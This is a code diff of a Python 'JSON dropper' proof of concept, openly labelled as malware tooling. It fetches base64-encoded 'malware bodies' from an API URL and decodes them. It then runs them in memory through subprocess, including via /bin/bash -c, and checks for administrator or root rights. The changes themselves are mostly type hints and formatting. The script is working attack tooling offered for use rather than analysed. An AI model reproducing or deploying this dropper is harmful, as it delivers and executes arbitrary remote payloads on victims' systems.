@@ -1,7 +1,6 @@
 ##############################################################################
 # Offline Py-JSON-Dropper - dropper - Python Script
-# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies, 
-# for final it will execute the malware based on the extention(ps1/sh/java/python) using in memory execution.
+# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies.
 # Author: Dor Dahan
 # License: MIT (See details in the LICENSE file or at the end of this script)
 ##############################################################################
@@ -13,6 +12,7 @@ import pip
 import platform
 import subprocess
 import tempfile
+from typing import Optional
 
 # Check the operating system
 OS = platform.system()
@@ -22,14 +22,15 @@ if OS == "Windows":
     WIN = True
 elif OS == "Linux":
     LIN = True
-    
+
 # The API url you used for fetch the json malware
 URL = ""
 
 # The pip packages to install
 packages = ["requests"]
 
-def install_package(package_name):
+
+def install_package(package_name: str) -> None:
     """
     Will install the packages requirements for the script to run.
     :param package_name: The package name.
@@ -44,7 +45,8 @@ def install_package(package_name):
         except Exception:
             continue
 
-def find_main_methods(java_code):
+
+def find_main_methods(java_code: str) -> Optional[str]:
     lines = java_code.splitlines()
     in_main_method = False
     class_name = None
@@ -62,6 +64,7 @@ def find_main_methods(java_code):
             if in_main_method and class_name:
                 return class_name
             return None
+
 
 def execute_process(script_content: bytes, extension: str, malware: str) -> None:
     """
@@ -108,6 +111,7 @@ def execute_process(script_content: bytes, extension: str, malware: str) -> None
                 final_command = ["/bin/bash", "-c", script_content.decode("utf-8")]
                 execution(final_command)
 
+
 def execution(command: str) -> None:
     """
     Will execute the command using Shell
@@ -121,13 +125,13 @@ def execution(command: str) -> None:
     except subprocess.CalledProcessError:
         return
 
+
 def main():
     # Getting the response from the api server
     response = requests.get(url=URL).json()
 
     # Looping throw the keys in the json format
     for index, key in enumerate(response):
-
         # Create new file name via the index and file name
         filename = response[key]["fullName"].split(".")
         extension = filename[-1]
@@ -136,11 +140,12 @@ def main():
         malware = response[key]["body"]
         encode = malware.encode("utf-8")
         decoded = base64.b64decode(encode)
-        
+
         # send to the execution process that will execute the script via in memory execution.
         execute_process(decoded, extension, malware)
 
-def win_admin():
+
+def win_admin() -> bool:
     """
     Check if the user is administrator or regular user (Windows system only)
     :return: True/False
@@ -150,7 +155,8 @@ def win_admin():
     except ctypes.WinError:
         return False
 
-def lin_user():
+
+def lin_user() -> bool:
     """
     Check if the user is root or regular user (Linux system only)
     :return: True/False.
@@ -160,6 +166,7 @@ def lin_user():
         return True
     else:
         return False
+
 
 if __name__ == '__main__':
     # Install packages
